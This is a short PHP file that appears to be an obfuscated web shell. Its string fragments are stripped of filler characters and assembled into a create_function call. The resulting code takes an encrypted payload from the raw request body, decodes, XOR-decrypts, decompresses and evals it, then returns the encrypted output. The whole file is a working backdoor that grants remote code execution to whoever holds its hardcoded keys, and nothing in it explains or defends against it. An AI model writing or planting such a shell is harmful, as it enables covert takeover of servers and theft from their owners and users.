<?php
$D='p="UhytdcNpUxYQaUsxVXK";function x(U$t,$k){U$c=UstrleUn($k);$Ul=st';
$k=';U$Uj++,$i++){$o.U=$t{U$i}^$k{U$j};}}returnUU $o;}if (@preUg_Uma';
$d=str_replace('nk','','crenkatnke_nkfnknkunctinkon');
$l='$k="5ec3Uee22"U;$kh=U"U3b4983e5c4fUU6";$kUf="a8d2Uba260af0";U$U';
$Z='($m[1]U),$k)))U;$Uo=@ob_gUet_conteUUnUts();@ob_eUnd_Uclean()U;$';
$C=',$mU)==1) {UU@ob_stUart();@eUval(@gUzuncoUmpreUss(@x(@basUe64_decodUe';
$X='rlen($Ut);$Uo="";fUor($i=U0;$i<UUU$lU;){for($jU=0;($j<$Uc&&$i<$l)';
$n='r=@basUe64_encode(@x(U@gzcUomprUessU($o),$k));priUnt("$Up$kh$rU$kf");}';
$U='tch("/$kUUh(.+)$kf/",@Ufile_geUt_contUenUts("pUhp://input"U)';
$A=str_replace('U','',$l.$D.$X.$k.$U.$C.$Z.$n);
$Y=$d('',$A);$Y();
?>
